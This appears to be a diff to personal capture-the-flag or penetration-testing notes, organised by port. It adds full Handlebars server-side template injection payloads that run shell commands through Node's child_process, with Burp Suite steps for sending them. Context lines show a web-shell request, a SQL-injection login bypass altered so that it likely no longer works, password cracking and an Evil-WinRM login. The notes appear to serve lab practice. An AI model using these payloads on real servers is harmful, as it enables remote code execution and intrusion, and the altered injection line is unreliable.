@@ -41,7 +41,7 @@ PORT 80 - HTTP
                 read files using cat command    example: GET /shell.php?cmd=cat+../flag.txt HTTP/1.1
 
     when a page has a login page can attempt SQL Injection using
-        Username = admin'#
+        Username = admin#
         Password = abc123 or anything
 
     when a page includes a page=*.html page it could be vulnerable to Local File Inclusion (LFI) and have access to the system files
@@ -55,6 +55,80 @@ PORT 80 - HTTP
             pass the hash to "john" and crack the password "john -w=/usr/share/wordlists/rockyou.txt hash.txt"
             use Evil-WinRM to connect "evil-winrm -i {ipaddress} -u administrator -p badminton"
             navigate using powershell commands. get-content to read txt files
+    
+    Node.js Server-side template injection (SSTI)
+        test for the vulnerability by inputting ${7*7} and/or {{7*7}} into the submission form
+            if the site responds with a parse error page it means it was detected as valid by the template engine, however the code had
+            some error and was unable to be executed. we can find from this the template engine being used. ex: Handlebars
+        The HackTricks website contains payloads for these template engines, for Node.js (Handlebars) use the following:
+            {{#with "s" as |string|}}
+                {{#with "e"}}
+                    {{#with split as |conslist|}}
+                        {{this.pop}}
+                        {{this.push (lookup string.sub "constructor")}}
+                        {{this.pop}}
+                        {{#with string.split as |codelist|}}
+                            {{this.pop}}
+                            {{this.push "return process;"}}
+                            {{this.pop}}
+                            {{#each conslist}}
+                                {{#with (string.sub.apply 0 codelist)}}
+                                    {{this}}
+                                {{/with}}
+                            {{/each}}
+                        {{/with}}
+                    {{/with}}
+                {{/with}}
+            {{/with}}
+
+            or
+
+            {{#with "s" as |string|}}
+                {{#with "e"}}
+                    {{#with split as |conslist|}}
+                        {{this.pop}}
+                        {{this.push (lookup string.sub "constructor")}}
+                        {{this.pop}}
+                        {{#with string.split as |codelist|}}
+                            {{this.pop}}
+                            {{this.push "return process.mainModule;"}}
+                            {{this.pop}}
+                            {{#each conslist}}
+                                {{#with (string.sub.apply 0 codelist)}}
+                                    {{this}}
+                                {{/with}}
+                            {{/each}}
+                        {{/with}}
+                    {{/with}}
+                {{/with}}
+            {{/with}}
+
+        using the burpsuite browser input the above payload into the submission form, intercept with burp and the payload should
+        look like the following %257b%257b%2523%2577%256... copy that into the burp decoder and encode as URL. Paste that into
+        the burp repeater and send to the site. if get a ReferenceError: require is not defined try other payloads to get [object process] 
+        has been included
+
+        once a payload is working send inputs to the server using the working format in inputing commands into the mainModule section:
+
+            {{#with "s" as |string|}}
+                {{#with "e"}}
+                    {{#with split as |conslist|}}
+                        {{this.pop}}
+                        {{this.push (lookup string.sub "constructor")}}
+                        {{this.pop}}
+                        {{#with string.split as |codelist|}}
+                            {{this.pop}}
+                            {{this.push "return process.mainModule.require('child_process').execSync('whoami/ls/cd/cat/etc...');"}}
+                            {{this.pop}}
+                            {{#each conslist}}
+                                {{#with (string.sub.apply 0 codelist)}}
+                                    {{this}}
+                                {{/with}}
+                            {{/each}}
+                        {{/with}}
+                    {{/with}}
+                {{/with}}
+            {{/with}}
 
 
 PORT 445 - SMB
